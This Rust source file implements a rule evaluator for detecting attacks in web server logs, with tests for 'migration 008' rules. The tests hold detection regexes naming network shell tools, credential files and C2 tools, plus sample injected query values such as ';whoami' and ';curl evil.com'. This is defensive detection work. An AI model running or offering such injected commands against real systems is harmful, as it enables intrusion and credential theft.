use tracing::debug;
use regex::Regex;

use crate::types::LogEntry;

#[derive(Debug, Clone)]
pub struct NativeRuleEvaluator {
    patterns: Vec<CompiledPattern>,
}

#[derive(Debug, Clone)]
enum CompiledPattern {
    PathMatches(String),
    QueryMatches(String),
    UserAgentMatches(String),
    ClientIpMatches(String),
    MethodMatches(String),
    MethodEq(String),
    SourceEq(String),
    StatusCodeGte(u16),
    StatusCodeLte(u16),
    StatusCodeGt(u16),
    StatusCodeLt(u16),
    StatusNotEq(u16),
    ResponseSizeGte(u64),
    ResponseTimeGte(f64),
    HasField(String),
    PathNotEmpty,
    HourGte(u32),
    HourLt(u32),
    And(Vec<CompiledPattern>),
    Or(Vec<CompiledPattern>),
    Not(Box<CompiledPattern>),
}

impl NativeRuleEvaluator {
    pub fn compile(condition: &str) -> Result<Self, String> {
        // First strip iterator wrappers (exists/log -> ..., count/filter(...))
        let inner = strip_iterator_wrapper(condition);
        // Then strip log. prefix from inner condition
        let inner = strip_log_prefix(&inner);
        let patterns = parse_condition(&inner)?;
        Ok(Self { patterns })
    }

    /// Get the threshold from condition.
    /// Handles both the internal count_threshold(inner, N)/sum_threshold(inner, N)
    /// forms and the stored count(filter(logs, log -> ...)) >= N /
    /// sum(filter(logs, log -> ...), log -> field) >= N forms.
    pub fn get_threshold(&self, condition: &str) -> u32 {
        let c = condition.trim();

        // Internal wrapper form: count_threshold(inner, N) or sum_threshold(inner, N)
        for prefix in ["count_threshold(", "sum_threshold("] {
            if let Some(n) = c.find(prefix) {
                let rest = &c[n + prefix.len()..];
                if let Some(end) = rest.find(')') {
                    let inner = &rest[..end];
                    if let Some((_, count_str)) = inner.rsplit_once(", ") {
                        if let Ok(n) = count_str.trim().parse::<u32>() {
                            return n;
                        }
                    }
                }
            }
        }

        // Stored form ending with a comparison, e.g. "...)) >= 11" or "...)) > 10"
        if c.contains("count(filter(") || c.contains("sum(filter(") {
            // Trim to the trailing comparison: ">= N", "> N", "== N", "< N".
            for op in [" >=", " > ", " == ", " < ", ">=", "> ", "==", "< "] {
                if let Some(idx) = c.rfind(op) {
                    let tail = c[idx + op.len()..].trim();
                    if let Some(n) = tail.split_whitespace().next() {
                        if let Ok(n) = n.trim_end_matches('.').parse::<u32>() {
                            return n;
                        }
                    }
                }
            }
        }

        1 // Default: any match
    }

    pub fn evaluate(&self, logs: &[LogEntry]) -> bool {
        let matched: Vec<&LogEntry> = logs.iter()
            .filter(|log| self.patterns.iter().all(|p| p.matches_log(log)))
            .collect();
        let result = !matched.is_empty();
        debug!("Native evaluation: {}/{} logs matched", matched.len(), logs.len());
        result
    }

    pub fn count_matched(&self, logs: &[LogEntry]) -> usize {
        logs.iter()
            .filter(|log| self.patterns.iter().all(|p| p.matches_log(log)))
            .count()
    }
}

/// Strip `exists(logs, log -> ...)` or `count(filter(logs, log -> ...))` wrappers
fn strip_iterator_wrapper(condition: &str) -> String {
    let condition = condition.trim();

    // Pattern: exists(logs, log -> <condition>)
    if condition.starts_with("exists(logs, log -> ") {
        // Find the inner condition by looking for the last ))
        // The wrapper is: exists(logs, log -> INNER)
        // INNER may contain parens from regex, so we use a simpler heuristic:
        // strip the prefix and the last )
        let inner = &condition["exists(logs, log -> ".len()..];
        // Remove trailing )
        if inner.ends_with(')') {
            return inner[..inner.len() - 1].to_string();
        }
    }

    // Pattern: count(filter(logs, log -> <condition>)) >= N
    // Use rfind so the wrapper's closing "))" (the last one) is located even when
    // <condition> contains consecutive closing parens inside a quoted regex, e.g.
    // path.matches("(?i)(/register|...|/admin/(users|accounts))").
    if condition.starts_with("count(filter(logs, log -> ") {
        if let Some(end_filter) = condition.rfind("))") {
            let inner_start = "count(filter(logs, log -> ".len();
            let inner = &condition[inner_start..end_filter];
            let rest = &condition[end_filter + 2..];
            if let Some(n) = extract_number(rest) {
                return format!("count_threshold({}, {})", inner, n);
            }
            return inner.to_string();
        }
    }

    // Pattern: sum(filter(logs, log -> <condition>), log -> <field>) >= N
    if condition.starts_with("sum(filter(logs, log -> ") {
        if let Some(end_filter) = condition.find("), log -> ") {
            let inner_start = "sum(filter(logs, log -> ".len();
            let inner = &condition[inner_start..end_filter];
            let rest = &condition[end_filter + 1..];
            if let Some(n) = extract_number(rest) {
                return format!("sum_threshold({}, {})", inner, n);
            }
            return inner.to_string();
        }
    }

    condition.to_string()
}

fn extract_number(s: &str) -> Option<u64> {
    let s = s.trim();
    if let Some(rest) = s.strip_prefix(">= ") {
        rest.parse().ok()
    } else if let Some(rest) = s.strip_prefix("> ") {
        rest.parse::<u64>().ok().map(|n| n + 1)
    } else {
        s.parse().ok()
    }
}

/// Strip `log.` prefix from condition (from iterator lambda syntax)
fn strip_log_prefix(condition: &str) -> String {
    condition.replace("log.", "")
}

fn parse_condition(condition: &str) -> Result<Vec<CompiledPattern>, String> {
    let condition = condition.trim();

    // Handle count_threshold wrapper
    if condition.starts_with("count_threshold(") {
        let inner = &condition["count_threshold(".len()..condition.len() - 1];
        if let Some((cond, _count)) = inner.split_once(", ") {
            return parse_condition(cond);
        }
    }

    // Handle sum_threshold wrapper
    if condition.starts_with("sum_threshold(") {
        let inner = &condition["sum_threshold(".len()..condition.len() - 1];
        if let Some((cond, _threshold)) = inner.split_once(", ") {
            return parse_condition(cond);
        }
    }

    let mut patterns = Vec::new();

    // Handle AND conditions
    if condition.contains(" && ") {
        let parts: Vec<&str> = condition.split(" && ").collect();
        let mut sub_patterns = Vec::new();
        for part in parts {
            let mut p = parse_single_condition(part.trim())?;
            sub_patterns.append(&mut p);
        }
        patterns.push(CompiledPattern::And(sub_patterns));
        return Ok(patterns);
    }

    // Handle OR conditions
    if condition.contains(" || ") {
        let parts: Vec<&str> = condition.split(" || ").collect();
        let mut sub_patterns = Vec::new();
        for part in parts {
            let mut p = parse_single_condition(part.trim())?;
            sub_patterns.append(&mut p);
        }
        patterns.push(CompiledPattern::Or(sub_patterns));
        return Ok(patterns);
    }

    parse_single_condition(&condition)
}

fn parse_single_condition(condition: &str) -> Result<Vec<CompiledPattern>, String> {
    let condition = condition.trim();
    let mut patterns = Vec::new();

    // Handle ! prefix (NOT)
    if let Some(inner) = condition.strip_prefix('!') {
        let inner_patterns = parse_single_condition(inner)?;
        if let Some(first) = inner_patterns.into_iter().next() {
            patterns.push(CompiledPattern::Not(Box::new(first)));
        }
        return Ok(patterns);
    }

    // Handle method regex matches: method.matches("...")
    if condition.contains("method.matches(") {
        if let Some(re_str) = extract_regex(condition, "method") {
            patterns.push(CompiledPattern::MethodMatches(re_str));
            return Ok(patterns);
        }
    }

    // Handle method equality: method == "GET"
    if condition.contains("method ==") {
        if let Some(val) = extract_string_literal(condition, "method ==") {
            patterns.push(CompiledPattern::MethodEq(val));
            return Ok(patterns);
        }
    }

    // Handle source equality: source == "web-server"
    if condition.contains("source ==") {
        if let Some(val) = extract_string_literal(condition, "source ==") {
            patterns.push(CompiledPattern::SourceEq(val));
            return Ok(patterns);
        }
    }

    // Handle hour(timestamp) >= N / hour(@timestamp) >= N
    if (condition.contains("hour(timestamp) >=") || condition.contains("hour(@timestamp) >="))
        || (condition.contains("hour(timestamp) >") || condition.contains("hour(@timestamp) >")) {
        let marker = if condition.contains("hour(timestamp) >=") || condition.contains("hour(@timestamp) >=") {
            if condition.contains("hour(timestamp) >=") { "hour(timestamp) >=" } else { "hour(@timestamp) >=" }
        } else {
            if condition.contains("hour(timestamp) >") { "hour(timestamp) >" } else { "hour(@timestamp) >" }
        };
        if let Some(n) = condition.find(marker) {
            let rest = &condition[n + marker.len()..];
            if let Some(val) = rest.trim().split_whitespace().next() {
                if let Ok(val) = val.parse::<u32>() {
                    patterns.push(CompiledPattern::HourGte(val));
                    return Ok(patterns);
                }
            }
        }
    }

    // Handle hour(timestamp) < N / hour(@timestamp) < N
    if condition.contains("hour(timestamp) <") || condition.contains("hour(@timestamp) <") {
        let marker = if condition.contains("hour(timestamp) <") {
            "hour(timestamp) <"
        } else {
            "hour(@timestamp) <"
        };
        if let Some(n) = condition.find(marker) {
            let rest = &condition[n + marker.len()..];
            if let Some(val) = rest.trim().split_whitespace().next() {
                if let Ok(val) = val.parse::<u32>() {
                    patterns.push(CompiledPattern::HourLt(val));
                    return Ok(patterns);
                }
            }
        }
    }

    // Handle response.time >= N or response_time >= N
    if condition.contains("response.time >=") || condition.contains("response_time >=") {
        let marker = if condition.contains("response.time >=") {
            "response.time >="
        } else {
            "response_time >="
        };
        if let Some(n) = condition.find(marker) {
            let rest = &condition[n + marker.len()..];
            if let Some(val) = rest.trim().split_whitespace().next() {
                if let Ok(val) = val.parse::<f64>() {
                    patterns.push(CompiledPattern::ResponseTimeGte(val));
                    return Ok(patterns);
                }
            }
        }
    }

    // Handle status_code != N
    if condition.contains("status_code !=") {
        if let Some(n) = condition.find("status_code !=") {
            let rest = &condition[n + "status_code !=".len()..];
            if let Some(val) = rest.trim().split_whitespace().next() {
                if let Ok(val) = val.parse::<u16>() {
                    patterns.push(CompiledPattern::StatusNotEq(val));
                    return Ok(patterns);
                }
            }
        }
    }

    // Handle regex matches on path field
    if condition.contains("path.matches(") {
        if let Some(re_str) = extract_regex(condition, "path") {
            patterns.push(CompiledPattern::PathMatches(re_str));
            return Ok(patterns);
        }
    }

    // Handle regex matches on query field
    if condition.contains("query.matches(") {
        if let Some(re_str) = extract_regex(condition, "query") {
            patterns.push(CompiledPattern::QueryMatches(re_str));
            return Ok(patterns);
        }
    }

    // Handle regex matches on user_agent field
    if condition.contains("user_agent.original.matches(") {
        if let Some(re_str) = extract_regex(condition, "user_agent.original") {
            patterns.push(CompiledPattern::UserAgentMatches(re_str));
            return Ok(patterns);
        }
    }

    // Handle regex matches on client_ip field
    if condition.contains("client_ip.matches(") {
        if let Some(re_str) = extract_regex(condition, "client_ip") {
            patterns.push(CompiledPattern::ClientIpMatches(re_str));
            return Ok(patterns);
        }
    }

    // Handle status_code comparisons
    if let Some(n) = condition.find("status_code >=") {
        let rest = &condition[n + "status_code >=".len()..];
        if let Some(val) = rest.trim().split_whitespace().next() {
            if let Ok(val) = val.parse::<u16>() {
                patterns.push(CompiledPattern::StatusCodeGte(val));
                return Ok(patterns);
            }
        }
    }

    if let Some(n) = condition.find("status_code <=") {
        let rest = &condition[n + "status_code <=".len()..];
        if let Some(val) = rest.trim().split_whitespace().next() {
            if let Ok(val) = val.parse::<u16>() {
                patterns.push(CompiledPattern::StatusCodeLte(val));
                return Ok(patterns);
            }
        }
    }

    if let Some(n) = condition.find("status_code <") {
        let rest = &condition[n + "status_code <".len()..];
        if let Some(val) = rest.trim().split_whitespace().next() {
            if let Ok(val) = val.parse::<u16>() {
                patterns.push(CompiledPattern::StatusCodeLt(val));
                return Ok(patterns);
            }
        }
    }

    if let Some(n) = condition.find("status_code >") {
        let rest = &condition[n + "status_code >".len()..];
        if let Some(val) = rest.trim().split_whitespace().next() {
            if let Ok(val) = val.parse::<u16>() {
                patterns.push(CompiledPattern::StatusCodeGt(val));
                return Ok(patterns);
            }
        }
    }

    if let Some(n) = condition.find("status_code ==") {
        let rest = &condition[n + "status_code ==".len()..];
        if let Some(val) = rest.trim().split_whitespace().next() {
            if let Ok(val) = val.parse::<u16>() {
                patterns.push(CompiledPattern::StatusCodeGte(val));
                patterns.push(CompiledPattern::StatusCodeLte(val));
                return Ok(patterns);
            }
        }
    }

    // Handle response.size >= N or response_size >= N
    if condition.contains("response.size >=") || condition.contains("response_size >=") {
        let marker = if condition.contains("response.size >=") {
            "response.size >="
        } else {
            "response_size >="
        };
        if let Some(n) = condition.find(marker) {
            let rest = &condition[n + marker.len()..];
            if let Some(val) = rest.trim().split_whitespace().next() {
                if let Ok(val) = val.parse::<u64>() {
                    patterns.push(CompiledPattern::ResponseSizeGte(val));
                    return Ok(patterns);
                }
            }
        }
    }

    // Handle has("field") or field != null
    if condition.contains("app.user.id != null") || (condition.contains("user_id") && condition.contains("!= null")) {
        patterns.push(CompiledPattern::HasField("user_id".to_string()));
        return Ok(patterns);
    }

    // Handle path != "" (non-empty path)
    if condition == "path != \"\"" || condition == "path != ''" {
        patterns.push(CompiledPattern::PathNotEmpty);
        return Ok(patterns);
    }

    if let Some(field) = condition.strip_prefix("has(\"") {
        if let Some(field) = field.strip_suffix("\")") {
            patterns.push(CompiledPattern::HasField(field.to_string()));
            return Ok(patterns);
        }
    }

    Err(format!("Could not parse condition: {}", condition))
}

fn extract_regex(condition: &str, method_call: &str) -> Option<String> {
    let marker = format!("{}.matches(\"", method_call);
    if let Some(start) = condition.find(&marker) {
        let rest = &condition[start + marker.len()..];
        if let Some(end) = rest.find("\"") {
            let raw = &rest[..end];
            let unescaped = raw.replace("\\\\", "\\").replace("\\\"", "\"");
            return Some(unescaped);
        }
    }
    None
}

fn extract_string_literal(condition: &str, marker: &str) -> Option<String> {
    if let Some(start) = condition.find(marker) {
        let rest = &condition[start + marker.len()..];
        let rest = rest.trim();
        if let Some(quoted) = rest.strip_prefix('"') {
            let end = quoted.find('"')?;
            return Some(quoted[..end].to_string());
        }
    }
    None
}

impl CompiledPattern {
    fn matches_log(&self, log: &LogEntry) -> bool {
        match self {
            CompiledPattern::PathMatches(pattern) => {
                if let Ok(re) = Regex::new(pattern) {
                    re.is_match(&log.path)
                } else {
                    false
                }
            }
            CompiledPattern::QueryMatches(pattern) => {
                if let Some(ref query) = log.query {
                    if let Ok(re) = Regex::new(pattern) {
                        re.is_match(query)
                    } else {
                        false
                    }
                } else {
                    false
                }
            }
            CompiledPattern::UserAgentMatches(pattern) => {
                if let Some(ref ua) = log.user_agent {
                    if let Ok(re) = Regex::new(pattern) {
                        re.is_match(ua)
                    } else {
                        false
                    }
                } else {
                    false
                }
            }
            CompiledPattern::ClientIpMatches(pattern) => {
                if let Ok(re) = Regex::new(pattern) {
                    re.is_match(&log.client_ip)
                } else {
                    false
                }
            }
            CompiledPattern::MethodMatches(pattern) => {
                if let Ok(re) = Regex::new(pattern) {
                    re.is_match(&log.method)
                } else {
                    false
                }
            }
            CompiledPattern::MethodEq(expected) => {
                log.method == *expected
            }
            CompiledPattern::SourceEq(expected) => {
                log.source == *expected
            }
            CompiledPattern::StatusCodeGte(min) => {
                log.status_code >= *min
            }
            CompiledPattern::StatusCodeLte(max) => {
                log.status_code <= *max
            }
            CompiledPattern::StatusCodeGt(min) => {
                log.status_code > *min
            }
            CompiledPattern::StatusCodeLt(max) => {
                log.status_code < *max
            }
            CompiledPattern::StatusNotEq(value) => {
                log.status_code != *value
            }
            CompiledPattern::ResponseSizeGte(min) => {
                log.response_size >= *min
            }
            CompiledPattern::ResponseTimeGte(min) => {
                log.response_time.map_or(false, |t| t >= *min)
            }
            CompiledPattern::HourGte(min) => {
                hour_of_timestamp(&log.timestamp).map_or(false, |h| h >= *min)
            }
            CompiledPattern::HourLt(max) => {
                hour_of_timestamp(&log.timestamp).map_or(false, |h| h < *max)
            }
            CompiledPattern::HasField(field) => {
                match field.as_str() {
                    "user_id" => log.user_id.is_some(),
                    "query" => log.query.is_some(),
                    "user_agent" => log.user_agent.is_some(),
                    "response_time" => log.response_time.is_some(),
                    _ => false,
                }
            }
            CompiledPattern::PathNotEmpty => {
                !log.path.is_empty()
            }
            CompiledPattern::And(patterns) => {
                patterns.iter().all(|p| p.matches_log(log))
            }
            CompiledPattern::Or(patterns) => {
                patterns.iter().any(|p| p.matches_log(log))
            }
            CompiledPattern::Not(inner) => {
                !inner.matches_log(log)
            }
        }
    }
}

/// Extract the hour-of-day (0-23, UTC) from an RFC3339 timestamp like
/// "2024-01-01T14:30:00Z". Returns None if the timestamp is unparsable.
fn hour_of_timestamp(timestamp: &str) -> Option<u32> {
    let t = timestamp.trim();
    let start = t.find('T')?;
    let hour_part = &t[start + 1..];
    let hour_str = hour_part.get(..2).unwrap_or(hour_part);
    hour_str.parse::<u32>().ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_log(
        timestamp: &str,
        method: &str,
        source: &str,
        path: &str,
        status: u16,
        response_time: Option<f64>,
    ) -> LogEntry {
        LogEntry {
            timestamp: timestamp.to_string(),
            source: source.to_string(),
            client_ip: "1.2.3.4".to_string(),
            method: method.to_string(),
            path: path.to_string(),
            query: Some(String::new()),
            status_code: status,
            response_size: 0,
            user_agent: Some(String::new()),
            user_id: None,
            response_time,
            extra: None,
        }
    }

    #[test]
    fn compiles_and_parses_condition() {
        let cond = "exists(logs, log -> status_code >= 400)";
        let eval = NativeRuleEvaluator::compile(cond).expect("should compile");
        assert_eq!(eval.get_threshold(cond), 1);
    }

    #[test]
    fn method_equality() {
        let cond = "method == \"POST\"";
        let eval = NativeRuleEvaluator::compile(cond).unwrap();
        assert!(eval.evaluate(&[make_log("2024-01-01T10:00:00Z", "POST", "web-server", "/x", 200, None)]));
        assert!(!eval.evaluate(&[make_log("2024-01-01T10:00:00Z", "GET", "web-server", "/x", 200, None)]));
    }

    #[test]
    fn method_regex() {
        let cond = "method.matches(\"(?i)(put|post|patch)\")";
        let eval = NativeRuleEvaluator::compile(cond).unwrap();
        assert!(eval.evaluate(&[make_log("t", "POST", "s", "/x", 200, None)]));
        assert!(!eval.evaluate(&[make_log("t", "GET", "s", "/x", 200, None)]));
    }

    #[test]
    fn source_equality() {
        let cond = "source == \"web-server\"";
        let eval = NativeRuleEvaluator::compile(cond).unwrap();
        assert!(eval.evaluate(&[make_log("t", "GET", "web-server", "/x", 200, None)]));
        assert!(!eval.evaluate(&[make_log("t", "GET", "auth-server", "/x", 200, None)]));
    }

    #[test]
    fn response_time_threshold() {
        let cond = "response.time >= 5.0";
        let eval = NativeRuleEvaluator::compile(cond).unwrap();
        assert!(eval.evaluate(&[make_log("t", "GET", "s", "/x", 200, Some(7.5))]));
        assert!(!eval.evaluate(&[make_log("t", "GET", "s", "/x", 200, Some(2.0))]));
        assert!(!eval.evaluate(&[make_log("t", "GET", "s", "/x", 200, None)]));
    }

    #[test]
    fn hour_filtering() {
        let cond = "exists(logs, log -> hour(@timestamp) >= 2 && hour(@timestamp) < 8)";
        let eval = NativeRuleEvaluator::compile(cond).unwrap();
        assert!(eval.evaluate(&[make_log("2024-01-01T05:00:00Z", "GET", "s", "/x", 200, None)]));
        assert!(!eval.evaluate(&[make_log("2024-01-01T12:00:00Z", "GET", "s", "/x", 200, None)]));
    }

    #[test]
    fn status_not_eq() {
        let cond = "status_code != 200";
        let eval = NativeRuleEvaluator::compile(cond).unwrap();
        assert!(eval.evaluate(&[make_log("t", "GET", "s", "/x", 403, None)]));
        assert!(!eval.evaluate(&[make_log("t", "GET", "s", "/x", 200, None)]));
    }

    #[test]
    fn and_condition() {
        let cond = "path.matches(\"(?i)(/admin|/dashboard)\") && method == \"POST\" && status_code >= 400";
        let eval = NativeRuleEvaluator::compile(cond).unwrap();
        assert!(eval.evaluate(&[make_log("t", "POST", "s", "/admin/login", 403, None)]));
        assert!(!eval.evaluate(&[make_log("t", "GET", "s", "/admin/login", 403, None)]));
    }

    // Validate the exact conditions from migration 008 (they must compile and behave).
    fn make_full(
        timestamp: &str,
        method: &str,
        source: &str,
        path: &str,
        query: &str,
        status: u16,
        ua: &str,
    ) -> LogEntry {
        LogEntry {
            timestamp: timestamp.to_string(),
            source: source.to_string(),
            client_ip: "1.2.3.4".to_string(),
            method: method.to_string(),
            path: path.to_string(),
            query: Some(query.to_string()),
            status_code: status,
            response_size: 0,
            user_agent: Some(ua.to_string()),
            user_id: None,
            response_time: None,
            extra: None,
        }
    }

    #[test]
    fn migration_008_command_injection() {
        let cond = "exists(logs, log -> query.matches(\"(?i)[;|&][[:space:]]*(wget|curl|nc|ncat|netcat|bash|sh|/bin/sh|powershell|cmd|python|perl|ruby|php -r|id|whoami|uname|cat|rm|chmod|chown|mkfifo|base64|apt|yum|scp|socat)\"))";
        let eval = NativeRuleEvaluator::compile(cond).expect("cmd injection should compile");
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/x", "cmd=;whoami", 200, "ua")]));
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/x", "file.txt;curl%20evil.com", 200, "ua")]));
        assert!(!eval.evaluate(&[make_full("t", "GET", "s", "/x", "q=hello world", 200, "ua")]));
    }

    #[test]
    fn migration_008_encoded_command() {
        let cond = "exists(logs, log -> query.matches(\"(?i)((base64|b64|enc|encoded|enc64|eval|deobfuscate)[=_-][^&]{4,}.*(powershell|cmd|sh|bash|echo)|(LmV4ZQ==|a2F0|Y2F0IC9ldGMv|aHR0cDov|cm0gLWZ|aGxl))\"))";
        let eval = NativeRuleEvaluator::compile(cond).expect("encoded cmd should compile");
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/x", "cmd=base64:LmV4ZQ==", 200, "ua")]));
        assert!(!eval.evaluate(&[make_full("t", "GET", "s", "/x", "q=plain", 200, "ua")]));
    }

    #[test]
    fn migration_008_suspicious_encoding() {
        let cond = "exists(logs, log -> query.matches(\"(?i)(%[0-9a-f]{2}%[0-9a-f]{2}%[0-9a-f]{2}|(?:u%[0-9a-f]{4}){2,}|[?&](data|payload|cmd|exec|p|q)[=][A-Za-z0-9+/]{24,}={0,2}|[?&][A-Za-z0-9_]+[=](?:[A-Za-z0-9+/]{4}){12,}={0,2})\"))";
        let eval = NativeRuleEvaluator::compile(cond).expect("suspicious encoding should compile");
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/x", "?data=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNk", 200, "ua")]));
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/x", "?cmd=JTJmYmluJTJmc2glMjAlMj1jJTIwaWQ=", 200, "ua")]));
        assert!(!eval.evaluate(&[make_full("t", "GET", "s", "/x", "?q=normal", 200, "ua")]));
    }

    #[test]
    fn migration_008_credential_dump() {
        let cond = "exists(logs, log -> path.matches(\"(?i)(/etc/passwd|/etc/shadow|/proc/[0-9]+/(environ|mem|cmdline)|/home/[a-z0-9_]+/[.]ssh|/[.]aws/credentials|/[.]env|/[.]htpasswd|/[.]git/config|/wp-config[.]php|/web[.]config|/database[.](sql|bak|dump|sqlite)|/[.]kube/config)\"))";
        let eval = NativeRuleEvaluator::compile(cond).expect("cred dump should compile");
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/etc/passwd", "x", 200, "ua")]));
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/app/.env", "x", 200, "ua")]));
        assert!(!eval.evaluate(&[make_full("t", "GET", "s", "/index.html", "x", 200, "ua")]));
    }

    #[test]
    fn migration_008_password_spraying() {
        let cond = "count(filter(logs, log -> path.matches(\"(?i)(/auth/login|/login|/signin|/oauth/token|/api/v[0-9]+/auth/login)\") && method == \"POST\" && status_code >= 401 && status_code <= 429)) >= 5";
        let eval = NativeRuleEvaluator::compile(cond).expect("password spray should compile");
        let five: Vec<LogEntry> = (0..5)
            .map(|_| make_full("t", "POST", "s", "/auth/login", "u=a", 401, "ua"))
            .collect();
        let two: Vec<LogEntry> = (0..2).map(|_| make_full("t", "POST", "s", "/auth/login", "u=a", 401, "ua")).collect();
        assert_eq!(eval.get_threshold(cond), 5);
        assert_eq!(eval.count_matched(&five), 5);
        assert_eq!(eval.count_matched(&two), 2);
        assert!(eval.count_matched(&five) as u32 >= eval.get_threshold(cond));
        assert!((eval.count_matched(&two) as u32) < eval.get_threshold(cond));
    }

    #[test]
    fn migration_008_account_creation() {
        let cond = "count(filter(logs, log -> path.matches(\"(?i)(/register|/signup|/api/v[0-9]+/(users|accounts)|/admin/(users|accounts))\") && method == \"POST\" && status_code >= 200 && status_code <= 204)) >= 3";
        let eval = NativeRuleEvaluator::compile(cond).expect("account creation should compile");
        let three: Vec<LogEntry> = (0..3).map(|_| make_full("t", "POST", "s", "/api/v1/users", "u=a", 200, "ua")).collect();
        let two: Vec<LogEntry> = (0..2).map(|_| make_full("t", "POST", "s", "/api/v1/users", "u=a", 200, "ua")).collect();
        assert_eq!(eval.get_threshold(cond), 3);
        assert!(eval.count_matched(&three) as u32 >= eval.get_threshold(cond));
        assert!((eval.count_matched(&two) as u32) < eval.get_threshold(cond));
    }

    #[test]
    fn migration_008_discovery() {
        let cond = "exists(logs, log -> path.matches(\"(?i)(/admin|/dashboard|/wp-admin|/phpmyadmin|/server-status|/server-info|/config|/backup|/logs|/uploads|/[.]git/|/[.]env|/[.]aws/|/[.]ssh/|/robots.txt)\"))";
        let eval = NativeRuleEvaluator::compile(cond).expect("discovery should compile");
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/wp-admin", "x", 200, "ua")]));
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/.git/config", "x", 200, "ua")]));
        assert!(!eval.evaluate(&[make_full("t", "GET", "s", "/products", "x", 200, "ua")]));
    }

    #[test]
    fn migration_008_archive_exfil() {
        let cond = "count(filter(logs, log -> path.matches(\"(?i)/[^?]*[.](zip|rar|7z|tar[.]gz|tar[.]bz2|tar|gz|sql|bak|dump|db|pem|key|pst|ost)($|[?])\") && response_size >= 1048576)) >= 1";
        let eval = NativeRuleEvaluator::compile(cond).expect("archive exfil should compile");
        assert_eq!(eval.get_threshold(cond), 1);
        let big = {
            let mut l = make_full("t", "GET", "s", "/backup/backup.zip", "x", 200, "ua");
            l.response_size = 5_000_000;
            l
        };
        let small = {
            let mut l = make_full("t", "GET", "s", "/backup/backup.zip", "x", 200, "ua");
            l.response_size = 1000;
            l
        };
        assert_eq!(eval.count_matched(std::slice::from_ref(&big)), 1);
        assert_eq!(eval.count_matched(std::slice::from_ref(&small)), 0);
        assert!(eval.count_matched(std::slice::from_ref(&big)) as u32 >= eval.get_threshold(cond));
        assert!((eval.count_matched(std::slice::from_ref(&small)) as u32) < eval.get_threshold(cond));
    }

    #[test]
    fn migration_008_c2_user_agent() {
        let cond = "exists(logs, log -> user_agent.original.matches(\"(?i)(cobalt|beacon|mimikatz|metasploit|meterpreter|empire|nishang|psexec|sliver|havoc|brute ratel|evilginx|wmiexec|responder|sqlmap|nmap|gobuster|nikto|dirbuster)\"))";
        let eval = NativeRuleEvaluator::compile(cond).expect("c2 ua should compile");
        assert!(eval.evaluate(&[make_full("t", "GET", "s", "/x", "x", 200, "Mozilla/5.0 cobalt")]));
        assert!(!eval.evaluate(&[make_full("t", "GET", "s", "/x", "x", 200, "Mozilla/5.0 (Windows NT 10.0)")]));
    }

    #[test]
    fn migration_008_method_probing() {
        let cond = "count(filter(logs, log -> method.matches(\"(?i)(TRACE|OPTIONS|CONNECT|PROPFIND|MKCOL|COPY|MOVE)\"))) >= 5";
        let eval = NativeRuleEvaluator::compile(cond).expect("method probing should compile");
        let logs: Vec<LogEntry> = (0..5).map(|_| make_full("t", "OPTIONS", "s", "/x", "x", 200, "ua")).collect();
        assert!(eval.evaluate(&logs));
        assert_eq!(eval.get_threshold(cond), 5);
    }
}
